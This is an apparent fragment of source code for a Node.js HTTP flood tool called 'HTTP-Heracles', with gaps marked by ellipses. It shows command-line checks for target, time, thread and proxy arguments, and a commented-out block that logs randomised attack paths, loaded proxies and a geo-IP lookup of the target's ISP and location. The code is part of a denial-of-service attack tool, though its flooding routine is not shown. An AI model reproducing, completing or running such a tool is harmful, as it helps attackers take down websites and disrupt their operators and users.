...
getUrlTitle = require("get-url-title")
cplist = [
...
if (!thread) {
  console.log("\x1b[31m Error\x1b[37m: provide thread number");
  console.log("\x1b[36m usage\x1b[37m: node " + file + " <target> <time> <thread> <proxies>");
  process.exit();
}

if (isNaN(thread)) {
  console.log("\x1b[31m Error\x1b[37m: enter valid thread number");
  console.log("\x1b[36m usage\x1b[37m: node " + file + " <target> <time> <thread> <proxies>");
  process.exit();
}
...
/*        logger(`HTTP-Heracles`.yellow+` \x1b[0m|| \x1b[0mMade by \x1b[38;5;4msauko.app`)
        if(url.parse(target).path === "/[rand]"){
          logger(`\x1b[0mAttempting to get : \x1b[33m%s \x1b[37m|| \x1b[38;5;4m%s\x1b[0m`, target.replace("/[rand]", "/"), url.parse(target).host)
        } else if(url.parse(target).path === "/[randln12]"){
          logger(`\x1b[0mAttempting to get : \x1b[33m%s \x1b[37m|| \x1b[38;5;4m%s\x1b[0m`, target.replace("/[randln12]", "/"), url.parse(target).host)
        } else if(url.parse(target).path === "/[randln16]"){
          logger(`\x1b[0mAttempting to get : \x1b[33m%s \x1b[37m|| \x1b[38;5;4m%s\x1b[0m`, target.replace("/[randln16]", "/"), url.parse(target).host)
        } else if(url.parse(target).path === "/[randln24]"){
          logger(`\x1b[0mAttempting to get : \x1b[33m%s \x1b[37m|| \x1b[38;5;4m%s\x1b[0m`, target.replace("/[randln24]", "/"), url.parse(target).host)
        } else if(url.parse(target).path === "/[randln32]"){
          logger(`\x1b[0mAttempting to get : \x1b[33m%s \x1b[37m|| \x1b[38;5;4m%s\x1b[0m`, target.replace("/[randln32]", "/"), url.parse(target).host)
        } else if(url.parse(target).path === "/[randln64]"){
          logger(`\x1b[0mAttempting to get : \x1b[33m%s \x1b[37m|| \x1b[38;5;4m%s\x1b[0m`, target.replace("/[randln64]", "/"), url.parse(target).host)
        } else if(url.parse(target).path === "/[randnum12]"){
          logger(`\x1b[0mAttempting to get : \x1b[33m%s \x1b[37m|| \x1b[38;5;4m%s\x1b[0m`, target.replace("/[randnum12]", "/"), url.parse(target).host)
        } else if(url.parse(target).path === "/[randnum16]"){
          logger(`\x1b[0mAttempting to get : \x1b[33m%s \x1b[37m|| \x1b[38;5;4m%s\x1b[0m`, target.replace("/[randnum16]", "/"), url.parse(target).host)
        } else if(url.parse(target).path === "/[randnum24]"){
          logger(`\x1b[0mAttempting to get : \x1b[33m%s \x1b[37m|| \x1b[38;5;4m%s\x1b[0m`, target.replace("/[randnum24]", "/"), url.parse(target).host)
        } else if(url.parse(target).path === "/[randnum32]"){
          logger(`\x1b[0mAttempting to get : \x1b[33m%s \x1b[37m|| \x1b[38;5;4m%s\x1b[0m`, target.replace("/[randnum32]", "/"), url.parse(target).host)
        } else if(url.parse(target).path === "/[randnum64]"){
          logger(`\x1b[0mAttempting to get : \x1b[33m%s \x1b[37m|| \x1b[38;5;4m%s\x1b[0m`, target.replace("/[randnum64]", "/"), url.parse(target).host)
        } else if(url.parse(target).path === "/[randlet12]"){
          logger(`\x1b[0mAttempting to get : \x1b[33m%s \x1b[37m|| \x1b[38;5;4m%s\x1b[0m`, target.replace("/[randlet12]", "/"), url.parse(target).host)
        } else if(url.parse(target).path === "/[randlet16]"){
          logger(`\x1b[0mAttempting to get : \x1b[33m%s \x1b[37m|| \x1b[38;5;4m%s\x1b[0m`, target.replace("/[randlet16]", "/"), url.parse(target).host)
        } else if(url.parse(target).path === "/[randlet24]"){
          logger(`\x1b[0mAttempting to get : \x1b[33m%s \x1b[37m|| \x1b[38;5;4m%s\x1b[0m`, target.replace("/[randlet24]", "/"), url.parse(target).host)
        } else if(url.parse(target).path === "/[randlet32]"){
          logger(`\x1b[0mAttempting to get : \x1b[33m%s \x1b[37m|| \x1b[38;5;4m%s\x1b[0m`, target.replace("/[randlet32]", "/"), url.parse(target).host)
        } else if(url.parse(target).path === "/[randlet64]"){
          logger(`\x1b[0mAttempting to get : \x1b[33m%s \x1b[37m|| \x1b[38;5;4m%s\x1b[0m`, target.replace("/[randlet64]", "/"), url.parse(target).host)
        } else {
          logger(`\x1b[0mAttempting to get : \x1b[33m%s \x1b[37m|| \x1b[38;5;4m%s\x1b[0m`, target, url.parse(target).host)
        }
        logger(`\x1b[0mLoaded proxies : \x1b[33m%s \x1b[0m|| \x1b[33m%d \x1b[0mproxies`, process.argv[5], proxys.length)

        isp_format = target.replace(/^https?:\/\//, '')
        isp_format2 = isp_format.split("/", 1)
        isp_format3 = isp_format2[0]
        axios.get(`https://json.geoiplookup.io/${isp_format3}`).then(function(response) {
          logger(`\x1b[0mISP Detected to : \x1b[33m%s`, response.data.isp)
          logger(`\x1b[0mASN Detected to : \x1b[33m%s`, response.data.asn_number)
          logger(`\x1b[0mLocated to : \x1b[33m%s`, response.data.city)      
*/
